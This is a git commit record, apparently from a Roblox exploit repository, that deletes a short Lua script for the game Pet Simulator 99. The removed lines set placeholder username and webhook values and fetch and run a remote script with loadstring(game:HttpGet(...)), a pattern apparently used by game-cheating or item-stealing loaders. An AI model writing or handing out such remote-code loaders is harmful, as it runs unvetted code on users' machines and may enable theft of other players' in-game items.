5a44cca85418216d19cacb1924aefccd62808fcb
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-22 15:22:12 +0200

    Delete ps99/aasasasasasasa.lua

--- ps99/aasasasasasasa.lua
+++
@@ -1,5 +0,0 @@
-Username = "sa"
-Username2 = "as"
-Webhook = "as"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
